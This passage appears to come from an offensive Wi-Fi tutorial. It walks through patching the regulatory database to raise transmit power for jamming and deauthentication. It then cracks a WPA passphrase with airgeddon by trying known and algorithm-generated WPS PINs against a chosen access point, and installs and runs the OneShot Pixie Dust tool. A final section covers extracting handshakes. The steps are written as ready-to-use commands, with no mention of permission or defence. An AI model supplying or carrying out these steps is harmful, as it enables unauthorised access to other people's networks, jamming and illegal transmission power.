sudo cp $USER.key.pub.pem /lib/crda/pubkeys/

Restart your computer.

Now do not use sudo iw reg set BZ.

Let us check:

sudo iw reg get

Strings

country GB: DFS-ETSI

(2402 - 2482 @ 40), (N/A, 30), (N/A)

mean we are able increasing the power to 30 dBm.

We try:

sudo ip link set wlan0 down

sudo iw dev wlan0 set txpower fixed 30mBm

# sudo iw wlan0 set monitor control # if monitor mode needed

sudo ip link set wlan0 up

Result:

<image>

After we patched the database, there is no longer any need to change the value of the regulatory domains for any wireless interface!

  

Increasing TX power of the Wi-Fi adapter is undeniably useful only for Wi-Fi jamming, as well as for deauthentication attacks. In all other attacks, increasing TX power would not matter. Since power affects how loudly your Wi-Fi adapter is “talking”, but does not increase its sensitivity (how well it ‘hears’ others).

  

Changing value of regulatory domains lets to unlock some channels that might not be available in your country.

  

---

**Effective WPS PINs attack based on known PIN and PIN generation algorithms**

A brute force attack against Wi-Fi Protected Setup (WPS) PINs is used in order to recover WPA/WPA2 passphrases. Depending on the target's Access Point (AP), to recover the plain text WPA/WPA2 passphrase the average amount of time for the transitional online brute force method is between 4-10 hours.

Some Access Points are vulnerable to the Pixie Dust attack, which is performed by the Pixiewps tool. It allows to recover the WPS PIN in minutes or even seconds. Not all Access Points are vulnerable, so after checking with Pixiewps, if the attack failed, there is no other way but to perform full brute force attack.

However, before the full enumeration, you can try another effective method. Its essence lies in the fact of enumeration a small number of very likely PINs.

The sources of these WPS PINs are:

- database of known WPS PINs;
    
- PIN generation algorithms.
    

The database of known PINs is made for Access Points of certain manufacturers for which it is known that they use the same WPS PINs. This database contains the first three octets of MAC-addresses and a list of corresponding PINs that are very likely for this manufacturer.

There are several algorithms for generating WPS PINs. For example, ComputePIN and EasyBox use the MAC-address of the Access Point in their calculations. But the Arcadyan algorithm also requires a device ID.

Therefore, an attack on the WPS PIN can consist of the following actions (ordered by decreasing effectiveness):

- Pixie Dust susceptibility test
    
- Checking WPS PINs from the database of known PINs and generated by algorithms
    
- Full brute force attack
    

The second option is described in this article: effective WPS PINs attack based on known PIN database and PIN generation algorithms.

Airgeddon automates these attacks. Therefore we launch airgeddon:

git clone https://github.com/v1s1t0r1sh3r3/airgeddon.git

cd airgeddon/

sudo bash airgeddon.sh

Although airgeddon itself can set a wireless adapter to monitor mode, it will never be superfluous to execute the following commands before:

sudo systemctl stop NetworkManager

sudo airmon-ng check kill

They will kill the processes that we can interrupt our activity.

My USB with a Ralink Chip doesn't associate and reaver won't send a single PIN. There are known issues with the devices that uses rt2800usb drivers (chips RT3070, RT3272, RT3570, RT3572 etc). There is unfortunately right now no solution, but that which cannot be used with airgeddon. You can try to use bully which works a little better with these chipsets.

So in this guide I am using Alfa AWUS036NHA.

Since we will perform a brute force attack against WPS PIN, the owners of wireless adapter with Ralink chipset as well as Intel-based chipset adapter cannot perform the attacks described in this guide.

Launch airgeddon, Put interface in monitor mode, go “WPS attacks menu”:

<image>

We have to start by choosing the target, this is the fourth menu item. APs with blocked WPS are marked in red, the higher the signal level is the higher the probability of a successful attack:

<image>

Then choose the item ‘12. (reaver) Known PINs database based attack’.

We are asked about the timeout, put it at the maximum value (100), because there are not very many PINs and it will be insulting to miss the correct pin due to delays caused by communication interference:

<image>

Further I am informed:

Searching in PINs database. Please be patient...

No matches found in the PINs database

In the database there are no values for the selected AP – don’t worry, a few extra pins will be generated by the algorithms. In any case, PINs from well-known algorithms such as ComputePIN and EasyBox will be calculated and added, since all the necessary information is already available for them (only the MAC address is needed).

  

Then the program tells us:

Some PINs have been added calculated using the algorithms (ComputePIN, EasyBox, etc.), however you can add one more (Arcadyan). Calculating it requires certain data and a background scan will have to be performed. The process may be very slow. Do you want to proceed with the calculation to add it? [y/N]

In fact, the process is not particularly slow – it is set to a timeout of four minutes, and with a good signal level, the information collection will finish faster. By the way, if the information is collected all four minutes, and especially if this process was completed by timeout, then this is a bad sign – probably the signal is too weak to be able to start brute-force.

I recommend using the Arcadyan algorithm and replying y:

<image>

Further the program informs:

Arcadyan algorithm is not useful for the selected target network, a valid value can't be calculated

PINs calculated by algorithms have been added. The attack will be launched with a total of 3 PINs

After stopping the attack (using [Ctrl+C]), the window will not be closed automatically. So you'll have time to write down the password if successful. You'll have to close it manually

Well, we continue as is. The automatic checks for each of the pins is started.

  

AND….

<image>

The second PIN is suitable.

  

Therefore even with a lock after three incorrectly entered PINs, we still would have time to find out its password. Almost as fast as with Pixie Dust!

  

As you can see, the method WPS PINs attack based on known PIN database and PIN generation algorithms is workable. In my tests, from 3 to 35 PINs are usually collected, the attacks had variable success. But in general, the result is very good, especially for AP with a strong signal.

  

If the failure is due to the fact that the checking of some PINs was not completed and ended due to the timeout, it makes sense to try again for the target AP.

  

---

**OneShot**

[https://github.com/drygdryg/OneShot](https://github.com/drygdryg/OneShot)

[https://github.com/rofl0r/oneshot](https://github.com/rofl0r/oneshot)

OneShot is a Python script that performs a Pixie Dust attack without having to switch a Wi-Fi adapter to monitor mode. To obtain the necessary data, wpa_supplicant is used.

Requirements:

- Python 3.6 and above;
    
- Wpa supplicant;
    
- Pixiewps.
    

  

Usage:

oneshot.py <arguments>

Launch a Pixie Dust attack (-K) against the Access Point (-b 00:90:4C:C1:AC:21) using the specified interface (-i wlan0):

oneshot.py -i wlan0 -b 00:90:4C:C1:AC:21 -K

  

Launch a Pixie Dust attack (-K) against the Access Point (-b 00:90:4C:C1:AC:21) using the specified interface (-i wlan0):

oneshot.py -i wlan0 -b 00:90:4C:C1:AC:21 -K

  

**Installation on Kali Linux**

All the necessary dependencies are already present in Kali Linux, just download the script itself:

git clone https://github.com/drygdryg/OneShot

cd OneShot/

sudo ./oneshot.py --help

**Installation on Linux (Debian, Mint, Ubuntu)**

Dependency Installation:

sudo apt install -y python3 wpasupplicant wget pixiewps

Download script:

wget https://raw.githubusercontent.com/drygdryg/OneShot/master/oneshot.py

python3 oneshot.py --help

  

---

**How to extract all handshakes from a capture file with several handshakes**

A single network data capture file (pcap format) can contain more than one handshake. This can happen, for example, with the continued Airodump-ng capturing, as a result it can got several handshakes from one or more access points. Handshakes from files captured in ‘noisy’ conditions need additional verification and cleaning.

  

Several handshakes in one file can be obtained artificially, simply by combining them into one file. For example, the Besside-ng program (automatically captures handshakes from all access points within reach, for this purpose conducts deauthentication attack) creates a single .cap file for all captured handshake packets.

  

Therefore, this is not a rare situation, and to perform an attack on the wireless networks, whose handshakes are in the same file, you may need to extract each handshake.

  

---

**Related tools**

LANs.py (76.6%)

[https://en.kali.tools/?p=388](https://en.kali.tools/?p=388)

Aircrack-ng (Tool) (71.8%)

[https://en.kali.tools/?p=60](https://en.kali.tools/?p=60)

WiFite (68.4%)

[https://en.kali.tools/?p=18](https://en.kali.tools/?p=18)

Router Scan (68.4%)

[https://en.kali.tools/?p=244](https://en.kali.tools/?p=244)

mitmAP (62.5%)

[https://en.kali.tools/?p=274](https://en.kali.tools/?p=274)

Wash (RANDOM - 51.8%)

[https://en.kali.tools/?p=341](https://en.kali.tools/?p=341)